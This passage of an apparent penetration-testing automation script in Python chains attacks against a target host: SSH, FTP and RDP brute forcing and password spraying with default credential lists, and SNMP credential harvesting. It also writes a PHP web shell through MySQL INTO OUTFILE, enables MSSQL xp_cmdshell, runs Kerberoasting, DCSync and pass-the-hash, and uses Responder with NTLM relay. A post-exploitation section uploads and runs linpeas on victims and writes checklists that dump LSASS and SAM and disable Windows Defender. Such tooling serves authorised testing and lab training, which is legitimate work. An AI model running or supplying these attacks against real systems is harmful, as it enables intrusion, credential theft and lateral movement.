                report.add_finding(f"SMB: {label} has {access} on \\\\{target}\\{share}", sev)
            if access == "READ/WRITE":
                report.add_finding(f"SMB WRITE ACCESS: {label} → \\\\{target}\\{share} (potential RCE)", "CRITICAL")

    # ── Step 5: Additional enum ───────────────────────────────────────────────
    if which("enum4linux-ng") and ask("enum4linux-ng full RPC/user enum?"):
        await run_cmd(["enum4linux-ng", "-A", target],
                       stdout_file=smb_dir / "enum4linux-ng.txt")
        report.add_finding("enum4linux-ng full enum")

    if ask("MS17-010 EternalBlue check?"):
        await run_cmd(
            ["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", target],
            stdout_file=smb_dir / "ms17-010.txt",
        )
        report.add_finding("MS17-010 check", "HIGH")

    if tool and creds.userlist and creds.passlist and ask(f"{tool} credential spray?"):
        await run_cmd(
            [tool, "smb", target, "-u", str(creds.userlist),
             "-p", str(creds.passlist), "--continue-on-success"],
            stdout_file=smb_dir / "spray.txt",
        )
        report.add_finding(f"{tool} credential spray", "HIGH")

# ════════════════════════════════════ FTP ══════════════════════════════════════
async def enum_ftp(target: str, ports: List[int], out_dir: Path, creds: CredManager, report: Report):
    section(f"FTP Attacks  –  ports {ports}")
    ftp_dir = out_dir / "ftp"
    ftp_dir.mkdir(parents=True, exist_ok=True)
    tasks: List = []

    if ask("Anonymous FTP login?"):
        async def ftp_anon(host: str, port: int, out_file: Path):
            def _do():
                lines = []
                try:
                    with closing(ftplib.FTP()) as ftp:
                        ftp.connect(host, port, timeout=10)
                        ftp.login("anonymous", "anonymous@")
                        lines.append(f"[SUCCESS] anonymous@{host}:{port}")
                        for d in [".", "/", "/pub", "/incoming", "/upload"]:
                            try:
                                lines.append(f"\n--- LIST {d} ---")
                                ftp.retrlines(f"LIST {d}", callback=lines.append)
                            except Exception:
                                continue
                except Exception as e:
                    lines.append(f"[FAIL] {e}")
                out_file.write_text("\n".join(lines) + "\n", encoding="utf-8")
            await asyncio.to_thread(_do)
        for p in ports:
            tasks.append(asyncio.create_task(ftp_anon(target, p, ftp_dir / f"anon_{p}.txt")))
        report.add_finding("FTP anonymous login attempted")

    if which("hydra") and ask("hydra FTP brute?"):
        ulist    = Path(prompt("User list", str(creds.userlist or "")))
        plist    = Path(prompt("Pass list", str(creds.passlist or "/usr/share/wordlists/rockyou.txt")))
        port_val = int(prompt("Port", str(ports[0])))
        if ulist.exists() and plist.exists():
            tasks.append(asyncio.create_task(run_cmd(
                ["hydra", "-L", str(ulist), "-P", str(plist), target, "-s", str(port_val), "ftp"],
                stdout_file=ftp_dir / f"hydra_{port_val}.txt",
            )))
            report.add_finding(f"hydra FTP brute port {port_val}")

    if tasks:
        await asyncio.gather(*tasks)

# ════════════════════════════════════ SSH ══════════════════════════════════════
SSH_DEFAULTS = [("root","root"),("root","toor"),("root",""),("admin","admin"),
                ("kali","kali"),("ubuntu","ubuntu"),("pi","raspberry"),("user","user")]

async def enum_ssh(target: str, ports: List[int], out_dir: Path, creds: CredManager, report: Report):
    section(f"SSH Attacks  –  ports {ports}")
    ssh_dir = out_dir / "ssh"
    ssh_dir.mkdir(parents=True, exist_ok=True)
    tasks: List = []

    if ask("SSH banner enum via nmap?"):
        for p in ports:
            tasks.append(run_cmd(
                ["nmap", "-p", str(p), "-sV", "--script", "ssh2-enum-algos,ssh-hostkey", target],
                stdout_file=ssh_dir / f"banner_{p}.txt",
            ))

    if which("sshpass") and ask("Try default/known SSH creds?"):
        all_creds = creds.creds + SSH_DEFAULTS
        async def try_cred(host: str, port: int, user: str, passwd: str):
            cmd = ["sshpass", "-p", passwd, "ssh", "-o", "StrictHostKeyChecking=no",
                   "-o", "ConnectTimeout=4", "-p", str(port), f"{user}@{host}", "id"]
            rc, out = await run_cmd(cmd, silent=True)
            if rc == 0:
                found(f"SSH VALID: {user}:{passwd} port {port}")
                creds.add(user, passwd)
                report.add_cred(f"ssh:{user}:{passwd}@{host}:{port}")
        for p in ports:
            await asyncio.gather(*[try_cred(target, p, u, pw) for u, pw in all_creds[:12]])

    if which("hydra") and ask("hydra SSH brute?"):
        ulist = Path(prompt("User list", str(creds.userlist or "")))
        plist = Path(prompt("Pass list", str(creds.passlist or "/usr/share/wordlists/rockyou.txt")))
        for p in ports:
            if ulist.exists() and plist.exists():
                tasks.append(asyncio.create_task(run_cmd(
                    ["hydra", "-L", str(ulist), "-P", str(plist), "-s", str(p), target, "ssh"],
                    stdout_file=ssh_dir / f"hydra_{p}.txt",
                )))
                report.add_finding(f"hydra SSH brute port {p}")

    if tasks:
        await asyncio.gather(*tasks)

# ═══════════════════════════════════ LDAP ══════════════════════════════════════
async def enum_ldap(target: str, ports: List[int], out_dir: Path, report: Report):
    section(f"LDAP Enumeration  –  ports {ports}")
    if not which("ldapsearch"):
        warn("ldapsearch not found")
        return
    ldap_dir = out_dir / "ldap"
    ldap_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    if ask("LDAP anonymous bind?"):
        for p in ports:
            tasks.append(run_cmd(
                ["ldapsearch", "-x", "-H", f"ldap://{target}:{p}", "-s", "base", "namingContexts"],
                stdout_file=ldap_dir / f"naming_{p}.txt",
            ))
        report.add_finding("LDAP anonymous bind")

    if ask("LDAP full anonymous dump?"):
        base_dn = prompt("Base DN (e.g. dc=domain,dc=local)")
        if base_dn:
            for p in ports:
                tasks.append(run_cmd(
                    ["ldapsearch", "-x", "-H", f"ldap://{target}:{p}", "-b", base_dn],
                    stdout_file=ldap_dir / f"dump_{p}.txt",
                ))
            report.add_finding(f"LDAP full dump base={base_dn}")

    if tasks:
        await asyncio.gather(*tasks)

# ════════════════════════════════════ RDP ══════════════════════════════════════
async def enum_rdp(target: str, ports: List[int], out_dir: Path, creds: CredManager, report: Report):
    section(f"RDP Attacks  –  ports {ports}")
    rdp_dir = out_dir / "rdp"
    rdp_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    if ask("RDP vuln check (nmap)?"):
        for p in ports:
            tasks.append(run_cmd(
                ["nmap", "-p", str(p), "--script", "rdp-enum-encryption,rdp-vuln-ms12-020", target],
                stdout_file=rdp_dir / f"info_{p}.txt",
            ))

    tool = "ncrack" if which("ncrack") else ("hydra" if which("hydra") else None)
    if tool and ask(f"RDP brute ({tool})?"):
        ulist = Path(prompt("User list", str(creds.userlist or "")))
        plist = Path(prompt("Pass list", str(creds.passlist or "")))
        for p in ports:
            if ulist.exists() and plist.exists():
                cmd = (["ncrack", "-U", str(ulist), "-P", str(plist), f"rdp://{target}:{p}"]
                       if tool == "ncrack" else
                       ["hydra", "-L", str(ulist), "-P", str(plist), "-s", str(p), target, "rdp"])
                tasks.append(run_cmd(cmd, stdout_file=rdp_dir / f"{tool}_{p}.txt"))

    if tasks:
        await asyncio.gather(*tasks)

# ═══════════════════════════════════ SNMP ══════════════════════════════════════
def parse_snmp_creds(content: str) -> List[Tuple[str, str]]:
    """
    Extract credentials leaked in SNMP process argument strings.
    Catches common CLI flag patterns found in hrSWRunParameters (OID .25.4.2.1.5)
    and generic key=value config patterns inside STRING values.
    """
    results: List[Tuple[str, str]] = []
    for line in content.splitlines():
        if "STRING:" not in line:
            continue
        val = line.split("STRING:", 1)[1].strip().strip('"')

        # -u USER -p PASS  (any order)
        u = re.search(r'(?<!\w)-u\s+(\S+)', val)
        p = re.search(r'(?<!\w)-p\s+(\S+)', val)
        if u and p:
            results.append((u.group(1), p.group(1)))
            continue

        # --username USER --password PASS  (or = variants)
        u = re.search(r'--username[=\s]+(\S+)', val)
        p = re.search(r'--password[=\s]+(\S+)', val)
        if u and p:
            results.append((u.group(1), p.group(1)))
            continue

        # username=USER password=PASS  /  user=USER pass=PASS
        u = re.search(r'(?:username|user)[=:]\s*(\S+)', val, re.IGNORECASE)
        p = re.search(r'(?:password|passwd|pass)[=:]\s*(\S+)', val, re.IGNORECASE)
        if u and p:
            results.append((u.group(1), p.group(1)))
            continue

        # -U USER -P PASS  (uppercase flags, e.g. snmp, ftp tools)
        u = re.search(r'(?<!\w)-U\s+(\S+)', val)
        p = re.search(r'(?<!\w)-P\s+(\S+)', val)
        if u and p:
            results.append((u.group(1), p.group(1)))

    # deduplicate while preserving order
    seen = set()
    unique = []
    for pair in results:
        if pair not in seen:
            seen.add(pair)
            unique.append(pair)
    return unique


async def enum_snmp(target: str, ports: List[int], out_dir: Path, creds: CredManager, report: Report):
    section(f"SNMP Enumeration  –  ports {ports}")
    if not which("snmpwalk"):
        warn("snmpwalk not found")
        return
    snmp_dir = out_dir / "snmp"
    snmp_dir.mkdir(parents=True, exist_ok=True)
    tasks = []
    output_files: List[Path] = []

    if ask("SNMP community string enum?"):
        communities = ["public", "private", "community", "manager", "secret"]
        extra = prompt("Extra strings (comma-sep, or Enter to skip)", "")
        if extra:
            communities += [x.strip() for x in extra.split(",") if x.strip()]
        for p in ports:
            for comm in communities:
                out_file = snmp_dir / f"{comm}_{p}.txt"
                output_files.append(out_file)
                tasks.append(run_cmd(
                    ["snmpwalk", "-c", comm, "-v2c", f"{target}:{p}", "."],
                    stdout_file=out_file,
                ))
        report.add_finding(f"SNMP community enum ({len(communities)} strings)")

    if tasks:
        await asyncio.gather(*tasks)

    # ── Credential extraction from all SNMP output files ─────────────────────
    section("SNMP Credential Parser")
    total_found = 0
    for out_file in output_files:
        if not out_file.exists() or out_file.stat().st_size == 0:
            continue
        content       = out_file.read_text(errors="ignore")
        leaked_creds  = parse_snmp_creds(content)
        if leaked_creds:
            found(f"Credentials leaked in {out_file.name}:")
            for user, passwd in leaked_creds:
                print(c(RED, f"    username : {user}"))
                print(c(RED, f"    password : {passwd}"))
                print()
                creds.add(user, passwd)
                report.add_cred(f"SNMP:{user}:{passwd}  (source: {out_file.name})")
                total_found += 1
        else:
            # Still surface any STRING lines that mention common keywords
            # so the analyst can eyeball them even if pattern didn't match
            hits = [l.strip() for l in content.splitlines()
                    if "STRING:" in l and
                    re.search(r'(?i)(passw|secret|token|apikey|key|credential)', l)]
            if hits:
                warn(f"{out_file.name} — suspicious strings (manual review):")
                for h in hits[:10]:
                    print(c(YELLOW, f"    {h}"))
                cred_hints_file = snmp_dir / f"cred_hints_{out_file.stem}.txt"
                cred_hints_file.write_text("\n".join(hits), encoding="utf-8")
                report.add_finding(
                    f"SNMP {out_file.name}: suspicious strings saved to {cred_hints_file.name}",
                    "HIGH",
                )

    if total_found:
        info(f"SNMP credential extraction complete — {total_found} credential(s) added to session")
    else:
        info("No credentials extracted from SNMP output")

# ══════════════════════════════ DATABASE ATTACKS ════════════════════════════════
DB_DEFAULTS = {
    "mysql":      [("root",""),("root","root"),("root","mysql"),("mysql","mysql")],
    "mssql":      [("sa",""),("sa","sa"),("sa","password"),("sa","admin")],
    "postgresql": [("postgres","postgres"),("postgres",""),("admin","admin")],
}

async def enum_db(target: str, db_services: List[Service], out_dir: Path,
                  creds: CredManager, report: Report):
    section("Database Attacks")
    db_dir = out_dir / "db"
    db_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    for svc in db_services:
        sname = svc.name.lower()
        if   "mysql"      in sname or svc.port == 3306: db_type = "mysql"
        elif "ms-sql"     in sname or svc.port == 1433: db_type = "mssql"
        elif "postgresql" in sname or svc.port == 5432: db_type = "postgresql"
        else: continue

        if not ask(f"Attack {db_type} port {svc.port}?"):
            continue

        out_file = db_dir / f"{db_type}_{svc.port}.txt"
        all_creds = DB_DEFAULTS[db_type] + creds.creds

        if db_type == "mysql" and which("mysql"):
            for u, p in all_creds:
                pw_arg = [f"-p{p}"] if p else []
                tasks.append(run_cmd(
                    ["mysql", "-h", target, f"-P{svc.port}", f"-u{u}"] + pw_arg + ["-e", "show databases;"],
                    stdout_file=out_file,
                ))
            if ask("MySQL INTO OUTFILE web shell?"):
                webroot = prompt("Web root", "/var/www/html")
                fname   = prompt("Shell name", "shell.php")
                info(f"Run: SELECT '<?php system($_REQUEST[\"cmd\"]);?>' INTO OUTFILE '{webroot}/{fname}';")
                report.add_finding(f"MySQL INTO OUTFILE attempted: {webroot}/{fname}", "CRITICAL")

        elif db_type == "mssql":
            tool = "netexec" if which("netexec") else ("crackmapexec" if which("crackmapexec") else None)
            if tool:
                for u, p in all_creds:
                    tasks.append(run_cmd(
                        [tool, "mssql", target, "-u", u, "-p", p, "--port", str(svc.port)],
                        stdout_file=out_file,
                    ))
            if ask("xp_cmdshell RCE?"):
                info("In mssqlclient: EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;")
                info("                EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;")
                info("                xp_cmdshell 'whoami';")
                report.add_finding("MSSQL xp_cmdshell RCE attempted", "CRITICAL")
            if ask("Hash capture via xp_dirtree + Responder?"):
                lhost = prompt("Your IP")
                info(f"In mssqlclient: EXEC master..xp_dirtree '\\\\{lhost}\\share\\';")
                info("Start: sudo responder -I <iface>")
                report.add_finding("MSSQL xp_dirtree hash capture", "HIGH")

        elif db_type == "postgresql" and which("psql"):
            for u, p in all_creds:
                tasks.append(run_cmd(
                    ["psql", "-h", target, "-p", str(svc.port), "-U", u, "-c", r"\l"],
                    stdout_file=out_file,
                    extra_env={"PGPASSWORD": p},
                ))
        report.add_finding(f"{db_type} attack port {svc.port}")

    if tasks:
        await asyncio.gather(*tasks)

# ═══════════════════════════════ ACTIVE DIRECTORY ══════════════════════════════
async def enum_ad(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("Active Directory Attacks")
    ad_dir = out_dir / "ad"
    ad_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    domain = creds.domain or prompt("Domain (e.g. inlanefreight.local)")
    dc_ip  = creds.dc_ip  or prompt("DC IP", target)
    creds.domain = domain
    creds.dc_ip  = dc_ip

    if which("kerbrute") and ask("Kerbrute user enum?"):
        ul = prompt("User list", str(creds.userlist or "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"))
        tasks.append(run_cmd(
            ["kerbrute", "userenum", "--dc", dc_ip, "--domain", domain, ul],
            stdout_file=ad_dir / "kerbrute_users.txt",
        ))
        report.add_finding(f"Kerbrute user enum: {domain}")

    if ask("AS-REP Roasting?"):
        cmd = None
        if which("GetNPUsers.py"):
            cmd = ["GetNPUsers.py", f"{domain}/", "-dc-ip", dc_ip, "-no-pass",
                   "-outputfile", str(ad_dir / "asrep.txt")]
        elif which("impacket-GetNPUsers"):
            cmd = ["impacket-GetNPUsers", f"{domain}/", "-dc-ip", dc_ip, "-no-pass",
                   "-outputfile", str(ad_dir / "asrep.txt")]
        if cmd:
            tasks.append(run_cmd(cmd, stdout_file=ad_dir / "asrep_out.txt"))
            report.add_finding("AS-REP Roasting", "HIGH")

    if creds.creds and ask("Kerberoasting?"):
        u, p = creds.creds[0]
        cmd = None
        if which("GetUserSPNs.py"):
            cmd = ["GetUserSPNs.py", f"{domain}/{u}:{p}", "-dc-ip", dc_ip,
                   "-outputfile", str(ad_dir / "kerberoast.txt")]
        elif which("impacket-GetUserSPNs"):
            cmd = ["impacket-GetUserSPNs", f"{domain}/{u}:{p}", "-dc-ip", dc_ip,
                   "-outputfile", str(ad_dir / "kerberoast.txt")]
        if cmd:
            tasks.append(run_cmd(cmd, stdout_file=ad_dir / "kerberoast_out.txt"))
            report.add_finding("Kerberoasting", "HIGH")

    if creds.creds and ask("BloodHound collection?"):
        if which("bloodhound-python"):
            u, p = creds.creds[0]
            tasks.append(run_cmd(
                ["bloodhound-python", "-u", u, "-p", p, "-d", domain,
                 "-dc", dc_ip, "-c", "all", "--zip", "-o", str(ad_dir / "bh")],
            ))
            report.add_finding("BloodHound collection run")

    tool = "netexec" if which("netexec") else ("crackmapexec" if which("crackmapexec") else None)
    if tool and ask(f"AD password spray ({tool})?"):
        ul    = prompt("User list", str(creds.userlist or ""))
        spwd  = prompt("Password to spray")
        if ul and spwd:
            tasks.append(run_cmd(
                [tool, "smb", dc_ip, "-u", ul, "-p", spwd, "--continue-on-success"],
                stdout_file=ad_dir / "spray.txt",
            ))
            report.add_finding(f"AD spray: {spwd}", "HIGH")

    if ask("Pass-the-Hash?"):
        nt   = prompt("NT hash")
        u    = prompt("Username")
        pth_t = prompt("Target IP", target)
        if nt and u:
            nt_full = f"aad3b435b51404eeaad3b435b51404ee:{nt}" if ":" not in nt else nt
            if tool:
                tasks.append(run_cmd(
                    [tool, "smb", pth_t, "-u", u, "-H", nt_full, "-x", "whoami"],
                    stdout_file=ad_dir / f"pth_{u}.txt",
                ))
            info(f"psexec PTH: impacket-psexec {u}@{pth_t} -hashes {nt_full}")
            report.add_finding(f"Pass-the-Hash as {u}", "CRITICAL")

    if creds.creds and ask("DCSync?"):
        u, p = creds.creds[0]
        sec  = "impacket-secretsdump" if which("impacket-secretsdump") else "secretsdump.py"
        if which(sec):
            tasks.append(run_cmd(
                [sec, f"{domain}/{u}:{p}@{dc_ip}", "-just-dc-user", "Administrator"],
                stdout_file=ad_dir / "dcsync.txt",
            ))
            report.add_finding("DCSync", "CRITICAL")

    if tool and creds.creds and ask(f"NTDS.dit dump ({tool})?"):
        u, p = creds.creds[0]
        tasks.append(run_cmd(
            [tool, "smb", dc_ip, "-u", u, "-p", p, "--ntds"],
            stdout_file=ad_dir / "ntds.txt",
        ))
        report.add_finding("NTDS.dit dump", "CRITICAL")

    if tasks:
        await asyncio.gather(*tasks)

    for hf, mode, label in [
        (ad_dir / "asrep.txt", "18200", "AS-REP"),
        (ad_dir / "kerberoast.txt", "13100", "Kerberoast"),
    ]:
        if hf.exists() and hf.stat().st_size > 0 and which("hashcat"):
            if ask(f"Crack {label} hashes with hashcat?"):
                wl = prompt("Wordlist", "/usr/share/wordlists/rockyou.txt")
                await run_cmd(
                    ["hashcat", "-m", mode, str(hf), wl, "--force"],
                    stdout_file=ad_dir / f"{label}_cracked.txt",
                )
                report.add_finding(f"{label} hash cracking")

# ═══════════════════════════════ CREDENTIAL ATTACKS ════════════════════════════
async def cred_attacks(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("Credential Attacks")
    cred_dir = out_dir / "creds"
    cred_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    if which("cewl") and ask("CeWL custom wordlist?"):
        url   = prompt("Target URL")
        depth = prompt("Depth", "4")
        minl  = prompt("Min length", "6")
        tasks.append(run_cmd(
            ["cewl", url, "-d", depth, "-m", minl, "--lowercase", "-w",
             str(cred_dir / "cewl.txt")],
        ))
        report.add_finding(f"CeWL wordlist from {url}")

    if which("hashcat") and ask("hashcat hash cracking?"):
        hf   = Path(prompt("Hash file"))
        mode = prompt("Mode (0=MD5 1000=NTLM 5600=NetNTLMv2 18200=Kerberos 13100=TGS)", "1000")
        wl   = prompt("Wordlist", "/usr/share/wordlists/rockyou.txt")
        if hf.exists():
            tasks.append(run_cmd(
                ["hashcat", "-m", mode, str(hf), wl, "--force"],
                stdout_file=cred_dir / "hashcat.txt",
            ))
            report.add_finding(f"hashcat mode {mode}")

    if which("john") and ask("John the Ripper?"):
        hf  = Path(prompt("Hash file"))
        fmt = prompt("Format (raw-md5, NT, sha512crypt, etc.)", "")
        wl  = prompt("Wordlist", "/usr/share/wordlists/rockyou.txt")
        if hf.exists():
            fmt_flag = [f"--format={fmt}"] if fmt else []
            tasks.append(run_cmd(
                ["john", f"--wordlist={wl}"] + fmt_flag + [str(hf)],
                stdout_file=cred_dir / "john.txt",
            ))

    if which("responder") and ask("Start Responder (LLMNR/NBT-NS poisoning)?"):
        iface = prompt("Interface", "eth0")
        await asyncio.create_subprocess_exec(
            "responder", "-I", iface,
            stdout=open(str(cred_dir / "responder.txt"), "wb"),
            stderr=asyncio.subprocess.STDOUT,
        )
        report.add_finding("Responder started", "HIGH")
        if which("impacket-ntlmrelayx") and ask("NTLM relay (ntlmrelayx)?"):
            rt   = prompt("Relay target IP")
            rcmd = prompt("Execute on target (or Enter to skip)", "")
            args = ["impacket-ntlmrelayx", "--no-http-server", "-smb2support", "-t", rt]
            if rcmd:
                args += ["-c", rcmd]
            tasks.append(run_cmd(args, stdout_file=cred_dir / "relay.txt"))
            report.add_finding(f"NTLM relay → {rt}", "CRITICAL")

    if tasks:
        await asyncio.gather(*tasks)

# ═══════════════════════════════ POST-EXPLOITATION ═════════════════════════════
def parse_linpeas(content: str) -> List[Tuple[str, str]]:
    """Extract high-value findings from linpeas output."""
    findings: List[Tuple[str, str]] = []
    patterns = [
        (r"(?i)(CVE-\d{4}-\d+)",                           "CRITICAL", "Kernel CVE"),
        (r"(?i)NOPASSWD",                                   "CRITICAL", "sudo NOPASSWD"),
        (r"(?i)SUID.*(/usr/|/bin/|/sbin/)",                 "HIGH",     "SUID binary"),
        (r"(?i)password\s*[=:]\s*\S+",                      "CRITICAL", "Password in file"),
        (r"(?i)private key",                                 "HIGH",     "Private key found"),
        (r"(?i)\.kdbx|\.key|\.pem|id_rsa",                  "HIGH",     "Key/vault file"),
        (r"(?i)writable.*(/etc/passwd|/etc/cron|/etc/shadow)","CRITICAL","Writable sensitive file"),
        (r"(?i)readable.*shadow",                            "CRITICAL", "Shadow readable"),
        (r"(?i)docker group",                                "HIGH",     "Docker group membership"),
        (r"(?i)lxd group",                                   "HIGH",     "LXD group membership"),
    ]
    for line in content.splitlines():
        for pattern, sev, label in patterns:
            if re.search(pattern, line):
                findings.append((sev, f"{label}: {line.strip()[:100]}"))
                break
    return findings

async def post_exploit_linux(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("Post-Exploitation – Linux")
    post_dir = out_dir / "post_linux"
    post_dir.mkdir(parents=True, exist_ok=True)

    info("TTY upgrade (run on victim):")
    print(c(YELLOW, "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"))
    print(c(YELLOW, "  Ctrl+Z → stty raw -echo → fg → export TERM=xterm-256color"))

    checklist = {
        "id_whoami":       "id && whoami && hostname",
        "sudo_l":          "sudo -l",
        "suid":            "find / -perm -4000 -type f 2>/dev/null",
        "sgid":            "find / -perm -2000 -type f 2>/dev/null",
        "writable":        "find / -writable -type d 2>/dev/null | grep -v proc",
        "cron":            "cat /etc/crontab; ls /etc/cron.*",
        "password_hunt":   "grep -rn 'password\\|passwd\\|secret' /var/www /opt /home 2>/dev/null",
        "ssh_keys":        "find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null",
        "history":         "cat ~/.bash_history",
        "env":             "env | grep -iE 'pass|key|token|secret'",
        "network":         "ip a; ip r; ss -tlnp",
        "processes":       "ps aux | grep -v '\\[' | head -40",
    }
    (post_dir / "checklist.sh").write_text(
        "\n".join(f"# {k}\n{v}\n" for k, v in checklist.items()), encoding="utf-8"
    )
    info(f"Checklist: {post_dir}/checklist.sh")

    # ── LinPEAS ───────────────────────────────────────────────────────────────
    if ask("Auto-upload and run linpeas.sh on victim?"):
        victim_user = prompt("Victim SSH user")
        victim_host = prompt("Victim host/IP", target)
        victim_port = prompt("Victim SSH port", "22")

        linpeas_local = post_dir / "linpeas.sh"
        if not linpeas_local.exists():
            info("Downloading linpeas.sh...")
            await run_cmd(
                ["curl", "-s", "-L",
                 "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
                 "-o", str(linpeas_local)],
                silent=True,
            )

        if linpeas_local.exists():
            remote_path = "/tmp/linpeas.sh"
            info("Uploading linpeas.sh...")
            scp_cmd = ["scp", "-P", victim_port, "-o", "StrictHostKeyChecking=no",
                       str(linpeas_local), f"{victim_user}@{victim_host}:{remote_path}"]
            rc, _ = await run_cmd(scp_cmd, silent=True)
            if rc == 0:
                info("Running linpeas.sh (this may take 2-3 minutes)...")
                out_remote   = "/tmp/linpeas_out.txt"
                run_cmd_str  = f"chmod +x {remote_path} && {remote_path} > {out_remote} 2>&1"
                ssh_run_cmd  = ["ssh", "-p", victim_port, "-o", "StrictHostKeyChecking=no",
                                 f"{victim_user}@{victim_host}", run_cmd_str]
                stop = threading.Event()
                sp   = threading.Thread(target=_spinner, args=("linpeas running", stop), daemon=True)
                sp.start()
                rc2, _ = await run_cmd(ssh_run_cmd, silent=True)
                stop.set(); sp.join()

                # Download output
                local_out = post_dir / "linpeas_out.txt"
                scp_get   = ["scp", "-P", victim_port, "-o", "StrictHostKeyChecking=no",
                              f"{victim_user}@{victim_host}:{out_remote}", str(local_out)]
                await run_cmd(scp_get, silent=True)

                if local_out.exists():
                    content  = local_out.read_text(errors="ignore")
                    pe_finds = parse_linpeas(content)
                    if pe_finds:
                        section("LinPEAS Critical Findings")
                        for sev, msg in pe_finds:
                            clr = RED if sev == "CRITICAL" else YELLOW
                            print(c(clr, f"  [{sev}] {msg}"))
                            report.add_finding(f"LinPEAS: {msg}", sev)
                    info(f"Full linpeas output: {local_out}")
                    report.add_finding(f"LinPEAS run on {victim_host}")
            else:
                warn("SCP failed – check SSH access to victim")

    # ── linux-exploit-suggester ────────────────────────────────────────────────
    if ask("Run linux-exploit-suggester on victim?"):
        les_local = post_dir / "les.sh"
        if not les_local.exists():
            await run_cmd(
                ["curl", "-s", "-L",
                 "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh",
                 "-o", str(les_local)],
                silent=True,
            )
        if les_local.exists():
            victim_user = prompt("Victim SSH user")
            victim_host = prompt("Victim host/IP", target)
            victim_port = prompt("Victim SSH port", "22")
            remote = "/tmp/les.sh"
            await run_cmd(["scp", "-P", victim_port, "-o", "StrictHostKeyChecking=no",
                            str(les_local), f"{victim_user}@{victim_host}:{remote}"], silent=True)
            les_out = post_dir / "les_out.txt"
            rc, out = await run_cmd(
                ["ssh", "-p", victim_port, "-o", "StrictHostKeyChecking=no",
                 f"{victim_user}@{victim_host}", f"chmod +x {remote} && {remote}"],
            )
            les_out.write_text(out, encoding="utf-8")
            # Highlight high-probability exploits
            for line in out.splitlines():
                if "highly probable" in line.lower() or "probable" in line.lower():
                    found(line.strip())
                    report.add_finding(f"LES: {line.strip()}", "HIGH")
            info(f"LES output: {les_out}")

    report.add_finding("Linux post-exploitation run")

async def post_exploit_windows(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("Post-Exploitation – Windows")
    post_dir = out_dir / "post_windows"
    post_dir.mkdir(parents=True, exist_ok=True)

    ps_cmds = {
        "whoami_priv":  "whoami /all",
        "cred_hunt":    "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.ps1 2>nul",
        "lsass_dump":   "(Get-Process lsass).Id | ForEach-Object { rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $_ C:\\lsass.dmp full }",
        "sam_dump":     "reg.exe save hklm\\sam C:\\sam.save; reg.exe save hklm\\system C:\\system.save",
        "defender_off": "Set-MpPreference -DisableRealtimeMonitoring $true",
        "ps_history":   "type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "network":      "ipconfig /all; netstat -ano",
        "av_check":     "Get-MpComputerStatus | Select-Object -Property AMRunningMode,RealTimeProtectionEnabled",
    }
    (post_dir / "checklist.ps1").write_text(
        "\n".join(f"# {k}\n{v}\n" for k, v in ps_cmds.items()), encoding="utf-8"
    )
    info(f"Checklist: {post_dir}/checklist.ps1")

    if ask("Auto-upload and run winpeas.exe on victim?"):
        victim_user = prompt("Victim SSH/WinRM user")
        victim_host = prompt("Victim IP", target)
        victim_port = prompt("SSH port (if using SSH)", "22")
        wp_local    = post_dir / "winPEASx64.exe"
        if not wp_local.exists():
            info("Downloading winPEASx64.exe...")
            await run_cmd(
                ["curl", "-s", "-L",
                 "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
                 "-o", str(wp_local)],
                silent=True,
            )
        if wp_local.exists():
            info("Upload winPEASx64.exe via SCP or SMB and run:")
            info(f"  scp {wp_local} {victim_user}@{victim_host}:C:\\\\Windows\\\\Temp\\\\")
            info("  ssh into victim → C:\\Windows\\Temp\\winPEASx64.exe > C:\\Windows\\Temp\\wp_out.txt")
            info("Then download wp_out.txt and run: python3 enumx_v4.py (parse option)")
            report.add_finding("WinPEAS uploaded", "INFO")

    if ask("Parse LSASS dump (pypykatz)?"):
        dump = Path(prompt("Local lsass.dmp path"))
        if dump.exists() and which("pypykatz"):
            await run_cmd(["pypykatz", "lsa", "minidump", str(dump)],
                           stdout_file=post_dir / "pypykatz.txt")
            report.add_finding("LSASS parsed with pypykatz", "CRITICAL")

    if ask("Parse SAM dump (impacket-secretsdump)?"):
        sam  = Path(prompt("sam.save"))
        sys_ = Path(prompt("system.save"))
        if sam.exists() and sys_.exists():
            tool = "impacket-secretsdump" if which("impacket-secretsdump") else "secretsdump.py"
            await run_cmd(
                [tool, "-sam", str(sam), "-system", str(sys_), "LOCAL"],
                stdout_file=post_dir / "secretsdump.txt",
            )
            report.add_finding("SAM dump parsed", "CRITICAL")

    report.add_finding("Windows post-exploitation run")

# ════════════════════════════════ LATERAL MOVEMENT ═════════════════════════════
async def lateral_movement(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("Lateral Movement")
    lat_dir = out_dir / "lateral"
    lat_dir.mkdir(parents=True, exist_ok=True)

    u = p = nt_hash = ""
    if creds.creds:
        u, p = creds.creds[0]
    if creds.lm_hashes:
        nt_hash = creds.lm_hashes[0]
    lt = prompt("Target IP", target)

    if which("evil-winrm") and ask("evil-winrm shell?"):
        if nt_hash and ask("Use hash (PTH)?"):
            info(f"Run: evil-winrm -i {lt} -u {u} -H {nt_hash}")
        else:
            info(f"Run: evil-winrm -i {lt} -u {u} -p '{p}'")
        report.add_finding(f"evil-winrm → {lt}", "CRITICAL")

    if which("impacket-psexec") and ask("psexec shell?"):
        nt_full = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}" if nt_hash and ":" not in nt_hash else nt_hash
        if nt_hash:
            info(f"Run: impacket-psexec {u}@{lt} -hashes {nt_full}")
        else:
            info(f"Run: impacket-psexec {u}:'{p}'@{lt}")
